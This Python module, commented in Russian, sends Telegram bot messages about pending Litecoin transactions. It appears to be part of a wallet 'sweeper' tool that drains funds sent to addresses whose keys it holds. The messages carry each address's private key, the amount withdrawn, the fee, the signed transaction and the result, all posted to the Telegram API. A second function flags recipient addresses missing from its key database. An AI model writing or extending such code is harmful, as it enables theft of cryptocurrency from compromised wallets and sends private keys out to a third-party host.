import asyncio
import requests


async def telegram_message(bot_token, chat_ids, tx_hash, address, private_key, amount, n_index, send_amount, fee, sign, result_send):
    """Отправка сообщения об успешной транзакции в Telegram."""
    for chat_id in chat_ids:
        payload = {
            "chat_id": chat_id,
            "text": (
                f"\n♻️ Пендинг транзакция LTC: {tx_hash}\n"
                f"🪤|Адрес (из выхода): {address}\n"
                f"🗝|Приватный ключ: {private_key}\n"
                f"🍬|Сумма отправки: {amount} сатоши\n"
                f"🆔|Индекс выхода: {n_index}\n"
                f"💰|Сумма которую вывели: {send_amount}\n"
                f"⚖️|Комиссия при выводе: {fee}\n"
                f"✍🏿|Подписанная транзакция: {sign}\n"
                f"💣|Результат: {result_send}\n"
            )
        }
        await send_telegram_message(bot_token, payload)


async def address_not_found_message(tx_hash, address, amount, n_index):
    return (
        f"\nПендинг транзакция: {tx_hash}\n"
        f"Адрес получателя {address} не найден в базе данных.\n"
        f"Сумма: {amount} сатоши\n"
        f"Индекс выхода: {n_index}\n"
    )


async def send_telegram_message(bot_token, payload):
    """Функция для отправки сообщений в Telegram."""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    await asyncio.to_thread(requests.post, url, data=payload)
